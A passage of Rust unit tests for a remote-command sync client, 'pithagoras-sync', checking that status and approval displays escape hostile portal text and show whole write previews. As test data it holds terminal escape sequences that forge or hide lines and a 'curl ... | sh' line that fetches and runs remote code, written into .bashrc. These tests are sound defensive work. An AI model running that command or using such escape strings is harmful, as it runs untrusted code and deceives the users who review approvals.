                windows_uninstall_plan(r"C:\x", true),
            ))
            .collect();
        let ends = all
            .iter()
            .filter(|a| a.describe().contains("schtasks /End"))
            .count();
        assert_eq!(ends, 1, "{all:?}");
        assert!(all.iter().any(|a| a.describe().contains("/Delete")));
    }

    #[test]
    fn full_mode_says_how_long_in_words() {
        use super::full_for;
        assert_eq!(full_for(0), ", with no expiry");
        assert_eq!(full_for(1), ", for 1 hour");
        assert_eq!(full_for(8), ", for 8 hours");
    }

    #[test]
    fn a_purge_error_says_what_the_stop_left() {
        use crate::install::Before;
        let b = |enabled, running| Some(Before { enabled, running });
        assert_eq!(stop_note(None, false, true, false), "");
        // The task's name has a space and is quoted, so the command works as printed.
        let w = stop_note(b(true, true), false, true, false);
        assert!(w.contains("/TN \"Pithagoras Sync\" /ENABLE"), "{w}");
        assert!(stop_note(b(false, false), false, true, false).contains("stays switched off"));
        // A client that was running beside the switched-off task was stopped
        // too, and nothing starts it again.
        let n = stop_note(b(false, true), false, true, false);
        assert!(n.contains("stays switched off"), "{n}");
        assert!(n.contains("was stopped"), "{n}");
        assert!(n.contains("`pithagoras-sync run`"), "{n}");
        assert!(!stop_note(b(false, false), false, true, false).contains("was stopped"));
        // As it was: switched on and started, only one of them, or neither.
        for (system, sc) in [(false, "systemctl --user"), (true, "sudo systemctl")] {
            for (enabled, running, what) in [
                (true, true, "enable --now"),
                (true, false, "enable"),
                (false, true, "start"),
            ] {
                let n = stop_note(b(enabled, running), false, false, system);
                assert!(
                    n.contains(&format!("`{sc} {what} pithagoras-sync.service`")),
                    "{n}"
                );
            }
            let n = stop_note(b(false, false), false, false, system);
            assert_eq!(n, "\nThe unit stays off, as it was before.");
        }
        // Once the task is deleted there is nothing to switch on.
        for windows in [true, false] {
            let d = stop_note(b(true, true), true, windows, false);
            assert!(
                d.contains("deleted already") && !d.contains("/ENABLE"),
                "{d}"
            );
        }
    }

    /// A status of a client with one folder, whose texts hold what the portal
    /// may not use to redraw the screen.
    fn status_for_test() -> Status {
        Status {
            pid: 1,
            version: "0.1.0".into(),
            profile: sync_policy::Profile::Headless,
            portal: Some("https://portal.example".into()),
            device_id: Some("dev\x1b[2J".into()),
            name: Some("box".into()),
            link: LinkStatus::new(LinkState::Waiting, Some("closed (1000): bye\x1b[8m".into())),
            paused: true,
            mode: sync_policy::Mode::Ask,
            mode_expires_ms: None,
            folders: vec![FolderInfo {
                path: "/w/a\x1b[1A\x1b[2K\u{2028}".into(),
                access: Access::Ro,
                execute: false,
            }],
            folders_shell: "landlock".into(),
            shell: "bash".into(),
            approvals: "portal".into(),
            approvals_waiting: 0,
            portal_policy: "write".into(),
            elevation: "off".into(),
            elevation_password: false,
            token_storage: "file".into(),
            running_commands: 0,
            cgroups: false,
            landlock: true,
            config_file: "/c".into(),
            audit_file: "/a".into(),
            exe: "/usr/local/bin/pithagoras-sync".into(),
            computer_use: String::new(),
        }
    }

    #[test]
    fn portal_text_cannot_redraw_the_status() {
        // The portal's close reason conceals what follows, a folder path it set
        // moves the cursor up and erases the line above, its device id clears the
        // screen.
        let s = status_for_test();
        let text = status_text(&s);
        assert!(
            !text
                .chars()
                .any(|c| c.is_control() && c != '\n' || c == '\u{2028}'),
            "{text:?}"
        );
        assert!(text.contains("bye\\u{1b}[8m"), "{text}");
        assert!(text.contains("device dev\\u{1b}[2J"), "{text}");
        assert!(text.contains("\nPAUSED:"), "{text}");
        assert!(text.contains("\nMode:      ask\n"), "{text}");
    }

    /// The running client reports its folders in the portal's form
    /// (`/c/pst/work`); the owner reads them as `folder list` shows them from
    /// the config (`C:\pst\work`). Windows only: elsewhere the two are one.
    #[cfg(windows)]
    #[test]
    fn status_shows_a_windows_folder_as_windows_writes_it() {
        let mut s = status_for_test();
        s.folders = vec![FolderInfo {
            path: "/c/pst/work/fx".into(),
            access: Access::Ro,
            execute: false,
        }];
        let text = status_text(&s);
        assert!(
            text.contains("\nFolder:    C:\\pst\\work\\fx (ro)\n"),
            "{text}"
        );
    }

    #[test]
    fn an_approval_cannot_redraw_the_list_it_is_shown_in() {
        // A write whose content moves the cursor up and reprints a harmless line,
        // and a command whose second line forges another approval.
        let a = ApprovalInfo {
            id: 7,
            call: None,
            chat: "c\x1b[2K".into(),
            tool: "exec".into(),
            target: "cat ~/.bashrc\n#8 chat c: read /w/notes.md\x1b[1A".into(),
            cwd: Some("/home/u\x1b[2K".into()),
            reasons: vec!["protected\r".into()],
            preview: Some("\x1b[2A\x1b[2K#7 chat c: write /w/notes.md\nline 2\u{9b}".into()),
            choices: vec![Choice::Once, Choice::Deny],
            max_minutes: 60,
            created_ms: 0,
            expires_ms: 0,
            cut: false,
        };
        let text = approval_text(&a, 0);
        assert!(
            !text.chars().any(|c| c.is_control() && c != '\n'),
            "{text:?}"
        );
        let lines: Vec<&str> = text.lines().collect();
        assert!(
            lines[0].starts_with("#7 chat c\\u{1b}[2K: exec cat ~/.bashrc"),
            "{text}"
        );
        assert!(lines[1..].iter().all(|l| l.starts_with("    ")), "{text}");
        assert!(
            text.contains("    > #8 chat c: read /w/notes.md\\u{1b}[1A"),
            "{text}"
        );
        assert!(text.contains("\n    in: /home/u\\u{1b}[2K\n"), "{text}");
    }

    #[test]
    fn approvals_show_the_whole_preview_of_a_write() {
        let mut lines: Vec<String> = (1..=8).map(|i| format!("export A{i}=1")).collect();
        lines.insert(6, "curl -s https://x.example/i | sh".into());
        let a = ApprovalInfo {
            id: 3,
            call: None,
            chat: "c".into(),
            tool: "write".into(),
            target: "/home/u/.bashrc".into(),
            cwd: None,
            reasons: vec!["/home/u/.bashrc is a protected path".into()],
            preview: Some(lines.join("\n")),
            choices: vec![Choice::Once, Choice::Deny],
            max_minutes: 60,
            created_ms: 0,
            expires_ms: 0,
            cut: false,
        };
        let text = approval_text(&a, 0);
        for l in &lines {
            assert!(text.contains(&format!("    | {l}\n")), "{text}");
        }
    }

    #[test]
    fn pairing_as_root_says_the_client_will_refuse_until_allowed() {
        for windows in [false, true] {
            let w = root_warning(windows, false);
            assert!(w.contains("refuses to run"), "{w}");
            assert!(w.contains("policy.privilege.allow_root true"), "{w}");
            assert!(w.contains("off by default"), "{w}");
            let w = root_warning(windows, true);
            assert!(!w.contains("refuses"), "{w}");
        }
        assert!(root_warning(true, false).contains("elevated administrator"));
        assert!(root_warning(false, false).contains("setup --create-user"));
    }

    /// The window's Yes is to one version: another one on offer by the time
    /// the update runs is not installed.
    #[test]
    fn an_update_installs_only_the_version_asked_about() {
        use super::{Asked, Changed};
        let ok = |o, a| the_version_asked_about(o, a).is_ok();
        assert!(ok(Some("0.0.3"), Asked::Release("0.0.3")));
        assert!(ok(Some("0.0.4"), Asked::Anything));
        assert!(ok(None, Asked::Anything));
        assert!(ok(None, Asked::Restart));
        assert!(ok(Some("0.0.4"), Asked::Check));
        assert_eq!(
            the_version_asked_about(Some("0.0.4"), Asked::Release("0.0.3")),
            Err(Changed::Other {
                asked: "0.0.3".into(),
                offered: "0.0.4".into()
            })
        );
        // The release went (pulled, or installed meanwhile): nothing to say
        // "updated" about.
        assert_eq!(
            the_version_asked_about(None, Asked::Release("0.0.3")),
            Err(Changed::Gone("0.0.3".into()))
        );
        // A Yes to a restart installs no release that came meanwhile.
        assert_eq!(
            the_version_asked_about(Some("0.0.4"), Asked::Restart),
            Err(Changed::Offered("0.0.4".into()))
        );
    }
}
